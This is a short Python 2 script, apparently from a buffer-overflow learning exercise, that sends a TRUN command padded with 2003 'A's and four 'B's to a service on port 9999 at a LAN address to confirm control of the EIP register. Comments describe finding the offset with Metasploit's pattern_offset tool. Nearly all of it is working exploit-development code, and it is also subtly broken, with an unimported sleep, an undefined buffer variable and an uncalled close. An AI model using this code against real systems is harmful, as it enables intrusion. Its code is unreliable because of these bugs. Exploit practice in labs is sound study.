#!/usr/bin/python
import sys, socket

# 2.py sent the pattern_create in the offset variable. In Immunity debugger the EIP was listed as 386F4337
# -l = length or the approx number of bytes required to send to crash the app function
# -q = EIP found in 2.py
#This offset of 2003 was found using /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l numberofbytesaroundcrash -q 386F4337
#The "A"s fill up the heap with 414141414141 etc 41 being hex for A. The four "B"s are added because they will fill the EIP letting you know in immunity debugger that you have found the exact position of the EIP because if you get this right then EIP will be 42424242 which is hex for 4 Bs

shellcode = "A" * 2003 + "B" * 4

while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.0.143',9999))

        s.send(('TRUN /.:/' + shellcode))
        s.close
        sleep(1)
        buffer = buffer + "A" * 100

    except:
        print "Error connecting to server"
        sys.exit()
